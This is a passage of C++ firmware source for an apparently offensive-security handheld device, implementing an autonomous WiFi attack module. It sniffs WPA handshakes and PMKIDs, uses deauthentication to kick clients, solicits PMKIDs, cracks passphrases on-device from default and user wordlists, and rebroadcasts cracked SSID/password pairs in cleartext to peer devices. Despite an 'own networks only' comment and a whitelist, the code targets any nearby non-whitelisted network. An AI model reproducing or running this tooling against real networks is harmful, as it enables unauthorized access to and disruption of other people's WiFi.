// AL-ANQA — offensive security firmware for LilyGo T-Deck
// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2026 Abdallah Natsheh
//
// pwn / pw — autonomous pwnagotchi WiFi pet. See pwn.h + docs/plans/pwnagotchi-pwn.md.
//
// Design highlights (the parts no other ESP32 pwnagotchi has):
//  - roam channels, sniff EAPOL(M1/M2)+PMKID + beacons, write per-(BSSID,SSID) .cap
//  - crack ON-DEVICE during idle time with a PER-CAP RESUME CURSOR (progress.csv)
//    so slices resume instead of restarting, across reboots
//  - smart priority ordering: prior related passwords (same SSID or BSSID) +
//    built-in defaults tried first, all verified (cracked.csv)
//  - dedup by (BSSID,SSID); whitelist to never-touch own networks
//  - modes: active / stealth / passive (RF-signature ladder)
// Reuses wpa_crack (verify), cap_parse (parse), pcap_writer. Own networks only.

#include "pwn.h"
#include "display_manager.h"
#include "input_handling.h"
#include "sdcard_manager.h"
#include "wifi_functions.h"
#include "lockscreen_manager.h"
#include "dot11.h"
#include "deauth_functions.h"   // reuse the HW-verified deauth primitive (da/ws)
#include "pcap_writer.h"
#include "cap_parse.h"
#include "wpa_crack.h"
#include "mac_util.h"
#include "wifi_sd_guard.h"
#include "wifi_creds.h"       // wifiCredsSaveNvs — no-SD cracked-cred persistence (NVS "wifi")
#ifdef BOARD_TDECK_PLUS
#include "gps_manager.h"      // opportunistic geotag (Plus only, read-only if already running)
#endif
#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <SD.h>
#include <vector>
#include <math.h>
#include <mbedtls/md.h>

extern DisplayManager displayManager;
extern InputHandling  inputHandler;
extern SDCardManager  sdCardManager;
extern WiFiFunctions  wifiFunctions;

// Session SD state, resolved once in runPwn(). false ⇒ RAM-only cardless run:
// no .cap/backlog/progress, whitelist lives in RAM, captures crack in RAM off the
// built-in list, and a cracked cred is saved to NVS ("wifi") instead of cracked.csv.
static bool s_haveSd = true;

// ── files under /apps/pwn ─────────────────────────────────────────────────────
#define PWN_F_CRACKED   SD_DIR_PWN "/cracked.csv"     // time,bssid,ssid,password
#define PWN_F_CAPTURED  SD_DIR_PWN "/captured.csv"    // time,bssid,ssid,ch,type,rssi,lat,lon
#define PWN_F_PROGRESS  SD_DIR_PWN "/progress.csv"    // bssid,ssid,wordlist_id,next_index
#define PWN_F_WHITELIST SD_DIR_PWN "/whitelist.csv"   // type,value,label
#define PWN_F_WORDLIST  SD_DIR_PWN "/wordlist.txt"    // optional user dictionary
#define PWN_F_LEARN     SD_DIR_PWN "/learn.csv"       // channel,value,count (adaptive roaming)
#define PWN_F_AIDBG     SD_DIR_PWN "/ai_debug.log"    // human-readable learner trace (`pwn ai debug`)

// ── tunables (draft; see plan §5) ─────────────────────────────────────────────
static const uint8_t PWN_CHANS[]   = {1, 6, 11};
#define PWN_RECON_MS       4000
#define PWN_HOT_MS         12000    // "stay where the action is": after an M1 (a client is handshaking
                                    // RIGHT NOW), hold this channel & keep kicking it to complete the 4-way
#define PWN_HOT_MAX        30000    // ...but never camp one stubborn channel longer than this continuously
#define PWN_MAX_TARGETS    64
#define PWN_CRACK_SLICE_MS 300      // one crack BATCH (~a handful of candidates); short so the
                                    // loop can re-scan the air between batches and bail to capture
                                    // the instant a target appears (capture always > crack)
#define PWN_RSSI_CUTOFF    (-80)
#define PWN_RING           24
#define PWN_FRAME_MAX      256

enum PwnMode { PWN_ACTIVE, PWN_STEALTH, PWN_PASSIVE };

// small built-in high-probability default PSK list (tried before the big wordlist)
static const char* const PWN_DEFAULTS[] = {
    "password", "12345678", "administrator", "admin1234", "changeme12",
    "internet", "wireless", "1234567890", "qwertyuiop"
};
static const int PWN_DEFAULTS_N = sizeof(PWN_DEFAULTS) / sizeof(PWN_DEFAULTS[0]);

// ── promiscuous RX ring (WiFi task → main loop) ───────────────────────────────
struct PwnFrame { uint8_t data[PWN_FRAME_MAX]; uint16_t len; uint8_t kind; int8_t rssi; }; // kind:0 beacon 1 eapol
static volatile PwnFrame s_ring[PWN_RING];
static volatile uint8_t  s_rHead = 0, s_rTail = 0;
static volatile bool     s_sniffing = false;

static void IRAM_ATTR pwnRxCb(void* buf, wifi_promiscuous_pkt_type_t t) {
    if (!s_sniffing) return;
    const wifi_promiscuous_pkt_t* p = (const wifi_promiscuous_pkt_t*)buf;
    const uint8_t* d = p->payload;
    uint16_t len = p->rx_ctrl.sig_len;
    if (len < 24) return;
    static uint32_t s_dcnt = 0;
    uint8_t kind; uint16_t copyN;
    if (t == WIFI_PKT_MGMT && dot11::fSubtype(d) == dot11::ST_BEACON) {
        // AL-ANQA grid beacon? (SA = our prefix) → kind 3, else a normal AP beacon
        if (d[10] == 0xA2 && d[11] == 0x9A && d[12] == 0x0A) kind = 3;
        else kind = 0;
        copyN = len;
    } else if (t == WIFI_PKT_DATA) {
        dot11::Eapol ev;
        if (dot11::parseEapol(d, len, ev)) { kind = 1; copyN = len; }  // EAPOL-Key (priority)
        else { if ((++s_dcnt & 7) != 0) return; kind = 2; copyN = 24; } // client sighting, sampled 1/8
    } else return;
    uint8_t nh = (s_rHead + 1) % PWN_RING;
    if (nh == s_rTail) return;                          // full → drop
    PwnFrame& s = (PwnFrame&)s_ring[s_rHead];
    uint16_t n = copyN < PWN_FRAME_MAX ? copyN : PWN_FRAME_MAX;
    memcpy(s.data, d, n); s.len = n; s.kind = kind; s.rssi = p->rx_ctrl.rssi;
    s_rHead = nh;
}

// ── target table + one in-progress capture buffer (mirrors handshake_capture) ─
struct PwnTarget {
    uint8_t bssid[6];
    char    ssid[33];
    uint8_t ch;
    int8_t  rssi;
    bool    captured;      // usable .cap already on disk
    bool    wl;            // whitelisted — never attack/capture (tracked so its SSID is known)
};
static PwnTarget s_targ[PWN_MAX_TARGETS];
static int       s_nTarg = 0;

struct PwnCapBuf {
    bool     active;
    uint32_t startMs;      // when this capture began — abandoned if it never completes
    uint8_t  bssid[6];
    char     ssid[33];
    uint8_t  m1[PWN_FRAME_MAX]; uint16_t m1Len; bool haveM1;
    uint8_t  m2[PWN_FRAME_MAX]; uint16_t m2Len; bool haveM2;
    bool     m1HasPmkid;
};
static PwnCapBuf s_cap;
static uint8_t   s_apMac[6] = {0};   // our own hidden-softAP MAC — never target/attack it
// diag counters (logged per-hop in ai_debug.log) — tell whether the deauth/capture
// pipeline is firing AND landing: dD=directed bursts (client known), dB=broadcast bursts
// (no client), txf=frames the driver rejected (!=ESP_OK), m1/m2=EAPOL frames observed.
static uint32_t  s_dtxD = 0, s_dtxB = 0, s_txFail = 0, s_m1Seen = 0, s_m2Seen = 0;
static uint32_t  s_solTx = 0;   // clientless PMKID solicitations sent (auth+assoc pairs)

// ── helpers ───────────────────────────────────────────────────────────────────
static void macStr(const uint8_t* m, char* out) {
    snprintf(out, 18, "%02X:%02X:%02X:%02X:%02X:%02X", m[0], m[1], m[2], m[3], m[4], m[5]);
}
static bool macParse(const char* s, uint8_t* m) {
    return s && strlen(s) >= 17 &&
           sscanf(s, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &m[0], &m[1], &m[2], &m[3], &m[4], &m[5]) == 6;
}
// sanitize an SSID for use in a FAT filename
static void sanSsid(const char* in, char* out, size_t n) {
    if (!in || !in[0]) { snprintf(out, n, "hidden"); return; }
    size_t j = 0;
    for (size_t i = 0; in[i] && j < n - 1; i++) {
        char c = in[i];
        if (c == '/' || c == '\\' || c == ':' || c == '*' || c == '?' ||
            c == '"' || c == '<' || c == '>' || c == '|' || c == ' ') c = '_';
        if ((uint8_t)c < 0x20 || (uint8_t)c > 0x7E) c = '_';
        out[j++] = c;
    }
    out[j] = '\0';
    if (!out[0]) snprintf(out, n, "hidden");
}
// SSID → CSV-safe field (commas/newlines → space) for ledger keys + logs ONLY.
// The REAL ssid is always used for the crack (PBKDF2 salt); this is just so a
// comma in an SSID can't shift CSV columns and break dedup/priority/cursor.
static void csvSsid(const char* in, char* out, size_t n) {
    size_t j = 0;
    for (size_t i = 0; in && in[i] && j < n - 1; i++) {
        char c = in[i];
        out[j++] = (c == ',' || c == '\n' || c == '\r') ? ' ' : c;
    }
    out[j] = 0;
}
static void capPath(const uint8_t* bssid, const char* ssid, char* out, size_t n) {
    char mac[18]; macStr(bssid, mac);
    for (char* p = mac; *p; p++) if (*p == ':') *p = '-';
    char s[40]; sanSsid(ssid, s, sizeof(s));
    snprintf(out, n, SD_DIR_PWN "/%s_%.24s.cap", mac, s);
}

// synth a minimal beacon (MAC hdr + fixed fields + SSID IE) so the .cap carries the
// ESSID (PBKDF2 salt) without us having to buffer the real beacon frame per target.
static uint16_t buildBeacon(const uint8_t* bssid, const char* ssid, uint8_t* out) {
    uint16_t i = 0;
    out[i++] = 0x80; out[i++] = 0x00;                 // FC: beacon
    out[i++] = 0x00; out[i++] = 0x00;                 // duration
    for (int k = 0; k < 6; k++) out[i++] = 0xFF;      // DA broadcast
    for (int k = 0; k < 6; k++) out[i++] = bssid[k];  // SA
    for (int k = 0; k < 6; k++) out[i++] = bssid[k];  // BSSID
    out[i++] = 0x00; out[i++] = 0x00;                 // seq
    for (int k = 0; k < 8; k++) out[i++] = 0x00;      // timestamp
    out[i++] = 0x64; out[i++] = 0x00;                 // beacon interval
    out[i++] = 0x01; out[i++] = 0x00;                 // capability (ESS)
    uint8_t sl = ssid ? (uint8_t)strnlen(ssid, 32) : 0;
    out[i++] = 0x00; out[i++] = sl;                   // SSID IE
    for (uint8_t k = 0; k < sl; k++) out[i++] = ssid[k];
    return i;
}

// ── ledger I/O ────────────────────────────────────────────────────────────────
// cracked.csv: is (bssid,ssid) already solved?
static bool crackedHas(const uint8_t* bssid, const char* ssid) {
    File f = SD.open(PWN_F_CRACKED, FILE_READ);
    if (!f) return false;
    char macW[18]; macStr(bssid, macW);
    bool hit = false;
    while (f.available()) {
        String ln = f.readStringUntil('\n'); ln.trim();
        int c1 = ln.indexOf(','), c2 = ln.indexOf(',', c1 + 1), c3 = ln.indexOf(',', c2 + 1);
        if (c1 < 0 || c2 < 0 || c3 < 0) continue;
        String b = ln.substring(c1 + 1, c2), s = ln.substring(c2 + 1, c3);
        if (b.equalsIgnoreCase(macW) && s == ssid) { hit = true; break; }
    }
    f.close();
    return hit;
}
static void crackedAppend(const uint8_t* bssid, const char* ssid, const char* pw) {
    ScopedPromiscPause _;
    File f = SD.open(PWN_F_CRACKED, FILE_APPEND);
    if (!f) return;
    char mac[18]; macStr(bssid, mac);
    f.printf("@%lu,%s,%s,%s\n", (unsigned long)millis(), mac, ssid, pw);
    f.close();
}
// gather prior related passwords (same SSID OR same BSSID) into out (deduped)
static int priorPasswords(const uint8_t* bssid, const char* ssid,
                          std::vector<String>& out) {
    File f = SD.open(PWN_F_CRACKED, FILE_READ);
    if (!f) return 0;
    char macW[18]; macStr(bssid, macW);
    while (f.available()) {
        String ln = f.readStringUntil('\n'); ln.trim();
        int c1 = ln.indexOf(','), c2 = ln.indexOf(',', c1 + 1), c3 = ln.indexOf(',', c2 + 1);
        if (c1 < 0 || c2 < 0 || c3 < 0) continue;
        String b = ln.substring(c1 + 1, c2), s = ln.substring(c2 + 1, c3), pw = ln.substring(c3 + 1);
        if (pw.length() < 8) continue;
        if (b.equalsIgnoreCase(macW) || s == ssid) {
            bool dup = false;
            for (auto& e : out) if (e == pw) { dup = true; break; }
            if (!dup) out.push_back(pw);
        }
    }
    f.close();
    return (int)out.size();
}

// progress.csv cursor (bssid,ssid,wordlist_id,next_index) — rewrite-whole-file (small)
struct PwnCursor { String bssid, ssid, wid; long next; };
static void cursorLoad(std::vector<PwnCursor>& v) {
    File f = SD.open(PWN_F_PROGRESS, FILE_READ);
    if (!f) return;
    while (f.available()) {
        String ln = f.readStringUntil('\n'); ln.trim();
        int c1 = ln.indexOf(','), c2 = ln.indexOf(',', c1 + 1), c3 = ln.indexOf(',', c2 + 1);
        if (c1 < 0 || c2 < 0 || c3 < 0) continue;
        PwnCursor c;
        c.bssid = ln.substring(0, c1); c.ssid = ln.substring(c1 + 1, c2);
        c.wid = ln.substring(c2 + 1, c3); c.next = ln.substring(c3 + 1).toInt();
        v.push_back(c);
    }
    f.close();
}
static long cursorGet(const char* mac, const char* ssid, const String& wid) {
    std::vector<PwnCursor> v; cursorLoad(v);
    for (auto& c : v)
        if (c.bssid.equalsIgnoreCase(mac) && c.ssid == ssid) {
            if (c.wid != wid) return 0;      // wordlist changed → re-arm from top
            return c.next;
        }
    return 0;
}
static void cursorSet(const char* mac, const char* ssid, const String& wid, long next) {
    std::vector<PwnCursor> v; cursorLoad(v);
    bool found = false;
    for (auto& c : v)
        if (c.bssid.equalsIgnoreCase(mac) && c.ssid == ssid) { c.wid = wid; c.next = next; found = true; break; }
    if (!found) { PwnCursor c{ String(mac), String(ssid), wid, next }; v.push_back(c); }
    ScopedPromiscPause _;
    File f = SD.open(PWN_F_PROGRESS, FILE_WRITE);   // truncate + rewrite
    if (!f) return;
    for (auto& c : v) f.printf("%s,%s,%s,%ld\n", c.bssid.c_str(), c.ssid.c_str(), c.wid.c_str(), c.next);
    f.close();
}

// ── whitelist (cached in RAM for the session — hot path, no per-frame SD reads) ─
static std::vector<String> s_wlBssid;   // whitelisted MAC strings
static std::vector<String> s_wlSsid;    // whitelisted SSID names
// Extract a canonical MAC "XX:XX:XX:XX:XX:XX" from a whitelist bssid row's value.
// DELIBERATELY tolerant — the whitelist is an authorization-SAFETY feature, so a row that
// silently fails to match (and thus ATTACKS a protected AP) is the worst outcome. Accepts
// the canonical colon form AND the common hand-edit mistakes: comma/space/dash separators
// (natural in a CSV) and missing leading zeros ("0"->00). Reads exactly 6 hex octets and
// ignores any trailing label; returns "" if it can't get 6.
static int wlHexNibble(char c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}
static String wlNormalizeMac(const char* rest) {
    uint8_t oct[6]; int n = 0;
    for (const char* p = rest; *p && n < 6; ) {
        while (*p && wlHexNibble(*p) < 0) p++;                          // skip separators
        if (!*p) break;
        int v = wlHexNibble(*p++);                                      // first nibble
        if (*p && wlHexNibble(*p) >= 0) v = v * 16 + wlHexNibble(*p++); // optional second
        oct[n++] = (uint8_t)v;
    }
    if (n != 6) return String("");
    char out[18]; snprintf(out, sizeof(out), "%02X:%02X:%02X:%02X:%02X:%02X",
                           oct[0], oct[1], oct[2], oct[3], oct[4], oct[5]);
    return String(out);
}
static void whitelistLoad() {
    if (!s_haveSd) return;   // cardless: the RAM whitelist (from `pwn wl`) is the source; don't wipe it
    s_wlBssid.clear(); s_wlSsid.clear();
    File f = SD.open(PWN_F_WHITELIST, FILE_READ);
    if (!f) return;
    while (f.available()) {
        String ln = f.readStringUntil('\n'); ln.trim();
        if (ln.length() == 0 || ln[0] == '#') continue;
        int c1 = ln.indexOf(',');
        if (c1 < 0) continue;
        String type = ln.substring(0, c1);
        String rest = ln.substring(c1 + 1);
        if (type == "bssid") {
            String mac = wlNormalizeMac(rest.c_str());     // tolerant of : , - and no leading 0
            if (mac.length()) s_wlBssid.push_back(mac);
        } else if (type == "ssid") {
            int c2 = rest.indexOf(',');                    // ssid,<name>[,label]
            String name = (c2 < 0) ? rest : rest.substring(0, c2);
            name.trim();
            if (name.length()) s_wlSsid.push_back(name);
        }
    }
    f.close();
}
static bool whitelisted(const uint8_t* bssid, const char* ssid) {
    char macW[18]; macStr(bssid, macW);
    for (auto& b : s_wlBssid) if (b.equalsIgnoreCase(macW)) return true;
    if (ssid && ssid[0]) for (auto& s : s_wlSsid) if (s == ssid) return true;
    return false;
}

// ── crack a single .cap for up to budgetMs, resuming its cursor ────────────────
// returns: 1 hit, 0 no-hit-this-slice, -1 not crackable / already solved
static std::vector<String> s_priorityDone;   // keys done this session (bssid|ssid)
static std::vector<String> s_sessionCaps;     // .cap paths written this session (for [k] session-only)
static std::vector<String> s_crackSkip;       // caps that returned -1 this session (solved / exhausted /
                                              // unparseable) — don't re-open them, so a wordlist that has
                                              // no password for a cap can't keep stealing time from hunting
static int pwnCrackCap(const char* path, char* foundOut, size_t foundN, char* ssidOut, char* progOut,
                       uint8_t* bssidOut = nullptr) {
    if (progOut) progOut[0] = 0;
    capparse::CrackJob job; char err[64];
    if (!capparse::parseCap(path, job, err, sizeof(err))) return -1;
    if (ssidOut) strncpy(ssidOut, job.ssid, 33);
    if (bssidOut) memcpy(bssidOut, job.apMac, 6);
    char cssid[33]; csvSsid(job.ssid, cssid, sizeof(cssid));   // ledger/log key (real ssid still used for crypto)
    if (crackedHas(job.apMac, cssid)) return -1;

    char mac[18]; macStr(job.apMac, mac);
    String key = String(mac) + "|" + cssid;

    const mbedtls_md_info_t* sha1 = mbedtls_md_info_from_type(MBEDTLS_MD_SHA1);
    mbedtls_md_context_t ctx; mbedtls_md_init(&ctx); mbedtls_md_setup(&ctx, sha1, 1);
    auto tryPw = [&](const char* pw) -> bool {
        return job.haveHs
            ? wpacrack::verifyHandshake(pw, job.ssid, job.apMac, job.staMac, job.anonce,
                                        job.snonce, job.eapol, job.eapolLen, job.mic, &ctx, sha1)
            : wpacrack::verifyPMKID(pw, job.ssid, job.apMac, job.staMac, job.pmkid, &ctx, sha1);
    };
    int result = 0;

    // priority candidates (once per session per cap): prior related + defaults
    bool priDone = false;
    for (auto& k : s_priorityDone) if (k == key) { priDone = true; break; }
    if (!priDone) {
        std::vector<String> pri; priorPasswords(job.apMac, cssid, pri);
        for (auto& pw : pri)
            if (tryPw(pw.c_str())) { strncpy(foundOut, pw.c_str(), foundN - 1); result = 1; break; }
        if (!result)
            for (int i = 0; i < PWN_DEFAULTS_N; i++)
                if (tryPw(PWN_DEFAULTS[i])) { strncpy(foundOut, PWN_DEFAULTS[i], foundN - 1); result = 1; break; }
        s_priorityDone.push_back(key);
    }

    // main wordlist with resume cursor (SD wordlist.txt, else built-in list).
    // cursor `next_index` = BYTE OFFSET for an SD wordlist (O(1) seek resume, no
    // per-slice line re-skip), or array index for the built-in list.
    if (!result) {
        char wlPath[80]; sdCardManager.resolveWordlist(PWN_F_WORDLIST, wlPath, sizeof(wlPath));  // global → own
        bool useSd = SD.exists(wlPath);
        long wlSize = 0;
        String wid;
        if (useSd) { File w = SD.open(wlPath, FILE_READ); wlSize = w ? (long)w.size() : 0; if (w) w.close(); wid = String(wlSize); }
        else       wid = "builtin";

        long cur = cursorGet(mac, cssid, wid);
        bool exhausted = useSd ? (cur >= wlSize) : (cur >= (long)wpacrack::kBuiltinCount);
        if (exhausted) { mbedtls_md_free(&ctx); return -1; }   // nothing left → caller rotates
        uint32_t t0 = millis();

        if (useSd) {
            File w = SD.open(wlPath, FILE_READ);
            if (w) {
                if (cur > 0) w.seek(cur);                       // O(1) resume at saved byte offset
                while (w.available() && millis() - t0 < PWN_CRACK_SLICE_MS) {
                    String line = w.readStringUntil('\n'); line.trim();
                    if (line.length() >= 8 && line.length() <= 63 && tryPw(line.c_str())) {
                        strncpy(foundOut, line.c_str(), foundN - 1); result = 1; break;
                    }
                }
                long newpos = w.available() ? (long)w.position() : wlSize;   // == size → exhausted
                cursorSet(mac, cssid, wid, newpos);
                if (progOut) snprintf(progOut, 16, "%d%%", wlSize > 0 ? (int)(newpos * 100 / wlSize) : 0);
                w.close();
            }
        } else {
            long idx = cur;
            while (idx < wpacrack::kBuiltinCount && millis() - t0 < PWN_CRACK_SLICE_MS) {
                if (tryPw(wpacrack::kBuiltins[idx])) {
                    strncpy(foundOut, wpacrack::kBuiltins[idx], foundN - 1); result = 1; break;
                }
                idx++;
            }
            cursorSet(mac, cssid, wid, idx);
            if (progOut) snprintf(progOut, 16, "%ld/%d", idx, wpacrack::kBuiltinCount);
        }
    }
    mbedtls_md_free(&ctx);

    if (result) crackedAppend(job.apMac, cssid, foundOut);
    return result;
}

// ── target table ──────────────────────────────────────────────────────────────
static PwnTarget* targFind(const uint8_t* bssid) {
    for (int i = 0; i < s_nTarg; i++) if (memcmp(s_targ[i].bssid, bssid, 6) == 0) return &s_targ[i];
    return nullptr;
}
static PwnTarget* targAdd(const uint8_t* bssid, const char* ssid, uint8_t ch, int8_t rssi) {
    PwnTarget* t = targFind(bssid);
    bool isNew = false;
    if (!t) {
        if (s_nTarg >= PWN_MAX_TARGETS) return nullptr;
        t = &s_targ[s_nTarg++];
        memset(t, 0, sizeof(*t));
        memcpy(t->bssid, bssid, 6);
        isNew = true;
    }
    if (ssid && ssid[0]) strncpy(t->ssid, ssid, 32);
    t->ch = ch; t->rssi = rssi;
    // Already own this (BSSID,SSID)? A .cap on disk = a usable capture (we only write
    // complete HS/PMKID), or it's already cracked → never re-attack it (§6b).
    if (isNew && t->ssid[0]) {
        char cp[96]; capPath(t->bssid, t->ssid, cp, sizeof(cp));
        if (SD.exists(cp) || crackedHas(t->bssid, t->ssid)) t->captured = true;
    }
    return t;
}

// ── discovered clients (STAs) per AP — used for STEALTH directed deauth ────────
#define PWN_MAX_CLIENTS 32
struct PwnClient { uint8_t bssid[6], mac[6]; };
static PwnClient s_cli[PWN_MAX_CLIENTS];
static int       s_nCli = 0;
static void cliAdd(const uint8_t* bssid, const uint8_t* mac) {
    if (mac[0] & 0x01) return;                           // skip multicast/broadcast
    for (int i = 0; i < s_nCli; i++)
        if (memcmp(s_cli[i].bssid, bssid, 6) == 0 && memcmp(s_cli[i].mac, mac, 6) == 0) return;
    if (s_nCli >= PWN_MAX_CLIENTS) return;
    memcpy(s_cli[s_nCli].bssid, bssid, 6); memcpy(s_cli[s_nCli].mac, mac, 6); s_nCli++;
}
static const uint8_t* cliFor(const uint8_t* bssid) {
    for (int i = 0; i < s_nCli; i++) if (memcmp(s_cli[i].bssid, bssid, 6) == 0) return s_cli[i].mac;
    return nullptr;
}

// ── pwn-grid: peer greeting over a private AL-ANQA beacon (§12) ────────────────
// Identity = fixed AL-ANQA prefix + this device's own last 3 MAC bytes; carried in a
// beacon-format frame TX'd via esp_wifi_80211_tx and RX'd in our own promiscuous cb
// (no ESP-NOW API). Broadcast in active+passive; stealth stays dark (RX only).
static const uint8_t PWN_GRID_PREFIX[3] = {0xA2, 0x9A, 0x0A};   // "an AL-ANQA pwn pet"
#define PWN_GRID_TX_MS   3000
#define PWN_GRID_ADV_OFF 36          // GridAdv sits at this byte offset in the frame
#define PWN_MAX_PEERS    8
#define PWN_PEER_TTL_MS  30000
#define PWN_GRID_SWEEP_HI  13        // advert is swept over channels 1..this so a peer on ANY channel hears it
#define PWN_GRID_TX_GAP_MS 3         // ms between per-channel advert TX (let each frame leave before hopping)

struct __attribute__((packed)) GridAdv {
    char     magic[4];   // "ANQG"
    uint8_t  ver;
    char     name[12];
    uint16_t pwned, hs, pmkid, uptimeMin;
};
// A cracked-credential share (§12 v1.5): a deck that cracks a network broadcasts
// SSID+PSK so the whole pack auto-saves it. Same offset-36 slot as GridAdv, told
// apart by the inner magic ("ANQC" vs "ANQG"). PSK is cleartext over the pack's
// private beacon — own-network use only; TX gated off in stealth like all grid TX.
struct __attribute__((packed)) GridCred {
    char     magic[4];   // "ANQC"
    uint8_t  ver;
    char     ssid[33];
    char     psk[64];
    uint8_t  bssid[6];
};
struct GridPeer { char name[13]; uint16_t pwned, hs; int8_t rssi; uint32_t lastSeenMs; };
static GridPeer s_peer[PWN_MAX_PEERS];
static int      s_nPeer = 0;
static uint8_t  s_gridMac[6];
static char     s_gridName[13];
static char     s_metName[13];        // last newly-met peer (for the ticker)

// Outbound cred share: set by pwnShareCred() on a local crack, broadcast on the next
// few grid-TX ticks (redundant for lossy air), gated to active/passive in the loop.
static char     s_shareSsid[33];
static char     s_sharePsk[64];
static uint8_t  s_shareBssid[6];
static int      s_shareReps = 0;
// Inbound cred (a peer's crack), staged by drainOne → persisted in the main loop
// (SD/NVS writes can't happen in the drain hot path).
static bool     s_credRxPending = false;
static char     s_credRxSsid[33];
static char     s_credRxPsk[64];
static uint8_t  s_credRxBssid[6];
static std::vector<String> s_gridLearned;   // SSIDs already learned from peers (dedup)

static void gridInitIdentity() {      // grid MAC + auto name from the real STA MAC
    uint8_t base[6] = {0}; esp_wifi_get_mac(WIFI_IF_STA, base);
    memcpy(s_gridMac, PWN_GRID_PREFIX, 3);
    s_gridMac[3] = base[3]; s_gridMac[4] = base[4]; s_gridMac[5] = base[5];
    snprintf(s_gridName, sizeof(s_gridName), "ANQA-%02X%02X", base[4], base[5]);
    // optional name override in /apps/pwn/grid.conf  (name=...)
    File f = SD.open(SD_DIR_PWN "/grid.conf", FILE_READ);
    if (f) {
        while (f.available()) {
            String ln = f.readStringUntil('\n'); ln.trim();
            if (ln.startsWith("name=")) { String v = ln.substring(5); v.trim();
                if (v.length()) { strncpy(s_gridName, v.c_str(), 12); s_gridName[12] = 0; } break; }
        }
        f.close();
    }
}
// Build a beacon-format grid frame carrying `payload` at offset 36 (PWN_GRID_ADV_OFF).
// Shared by the advert (GridAdv) and the cred share (GridCred) — DRY.
static uint16_t gridBuildFrameRaw(uint8_t* out, const void* payload, uint16_t plen) {
    uint16_t i = 0;
    out[i++] = 0x80; out[i++] = 0x00; out[i++] = 0x00; out[i++] = 0x00;   // FC beacon + dur
    for (int k = 0; k < 6; k++) out[i++] = 0xFF;                          // DA broadcast
    for (int k = 0; k < 6; k++) out[i++] = s_gridMac[k];                  // SA = grid MAC
    for (int k = 0; k < 6; k++) out[i++] = s_gridMac[k];                  // BSSID
    out[i++] = 0x00; out[i++] = 0x00;                                     // seq
    for (int k = 0; k < 8; k++) out[i++] = 0x00;                          // timestamp
    out[i++] = 0x64; out[i++] = 0x00; out[i++] = 0x01; out[i++] = 0x00;   // interval + cap  (i==36)
    memcpy(out + i, payload, plen); i += plen;
    return i;
}
static uint16_t gridBuildFrame(uint8_t* out, const GridAdv& a) {
    return gridBuildFrameRaw(out, &a, sizeof(GridAdv));
}
// Broadcast our advert. A peer's promiscuous RX only ever hears ITS OWN current channel, so
// we SWEEP the advert across channels 1..PWN_GRID_SWEEP_HI — a peer roaming any channel then
// catches the greeting during the sweep. Without this, two full-13 decks would coincide only
// ~1/13 of the time (the full-13 roam default made the old single-channel TX rarely land).
// Both decks sweep, so both discover each other with NO time-sync. ~40ms per tick; the roam
// channel is restored at the end so capture/deauth resume where they were.
static void gridSendAdv(uint16_t pwned, uint16_t hs, uint16_t pmkid, uint16_t upMin, uint8_t roamCh) {
    GridAdv a; memset(&a, 0, sizeof(a));
    memcpy(a.magic, "ANQG", 4); a.ver = 1; strncpy(a.name, s_gridName, 12);
    a.pwned = pwned; a.hs = hs; a.pmkid = pmkid; a.uptimeMin = upMin;
    uint8_t fr[80]; uint16_t n = gridBuildFrame(fr, a);
    // Pause promiscuous for the sweep: TX doesn't need RX, and it stops an M1 from an AP on a
    // swept channel from clobbering an in-progress capture (s_cap resets on a new BSSID). The
    // guard restores promiscuous on scope-exit — after we've set the channel back to roamCh.
    ScopedPromiscPause _;
    for (uint8_t ch = 1; ch <= PWN_GRID_SWEEP_HI; ch++) {
        if (esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE) != ESP_OK) continue;  // region may block 12/13
        esp_wifi_80211_tx(WIFI_IF_AP, fr, n, false);   // AP iface — see softAP note in runPwnSession
        vTaskDelay(pdMS_TO_TICKS(PWN_GRID_TX_GAP_MS));
    }
    esp_wifi_set_channel(roamCh, WIFI_SECOND_CHAN_NONE);   // back to the roam channel (before promiscuous resumes)
}
// Broadcast a cracked credential to the pack — same swept-channel path as the advert,
// sent twice per call (lossy air). Caller gates on mode (never in stealth).
static void gridSendCred(const char* ssid, const char* psk, const uint8_t* bssid, uint8_t roamCh) {
    GridCred c; memset(&c, 0, sizeof(c));
    memcpy(c.magic, "ANQC", 4); c.ver = 1;
    strncpy(c.ssid, ssid, sizeof(c.ssid) - 1);
    strncpy(c.psk,  psk,  sizeof(c.psk)  - 1);
    memcpy(c.bssid, bssid, 6);
    uint8_t fr[160]; uint16_t n = gridBuildFrameRaw(fr, &c, sizeof(c));
    ScopedPromiscPause _;
    for (int rep = 0; rep < 2; rep++)
        for (uint8_t ch = 1; ch <= PWN_GRID_SWEEP_HI; ch++) {
            if (esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE) != ESP_OK) continue;
            esp_wifi_80211_tx(WIFI_IF_AP, fr, n, false);
            vTaskDelay(pdMS_TO_TICKS(PWN_GRID_TX_GAP_MS));
        }
    esp_wifi_set_channel(roamCh, WIFI_SECOND_CHAN_NONE);
}
static bool gridPeerUpdate(const char* name, uint16_t pwned, uint16_t hs, int8_t rssi) {
    for (int i = 0; i < s_nPeer; i++)
        if (strncmp(s_peer[i].name, name, 12) == 0) {
            s_peer[i].pwned = pwned; s_peer[i].hs = hs; s_peer[i].rssi = rssi;
            s_peer[i].lastSeenMs = millis(); return false;    // known peer
        }
    if (s_nPeer >= PWN_MAX_PEERS) return false;
    strncpy(s_peer[s_nPeer].name, name, 12); s_peer[s_nPeer].name[12] = 0;
    s_peer[s_nPeer].pwned = pwned; s_peer[s_nPeer].hs = hs; s_peer[s_nPeer].rssi = rssi;
    s_peer[s_nPeer].lastSeenMs = millis(); s_nPeer++;
    return true;                                              // newly met
}

// ── cardless single-HS RAM crack + cred persistence (§B/§C) ───────────────────
// One crack job at a time, held in RAM (no .cap). Extracted from s_cap via
// capparse::parseFrames; cracked in time-sliced passes off the built-in list +
// any passwords already learned this session. Mirrors pwnCrackCap's crypto.
static capparse::CrackJob s_ramJob;
static bool     s_ramJobActive  = false;
static uint8_t  s_ramJobBssid[6];
static long     s_ramJobIdx     = 0;      // built-in list cursor
static bool     s_ramJobPriDone = false;  // tried session priors yet?
static std::vector<String> s_ramPriors;   // passwords cracked this session (reuse across targets)

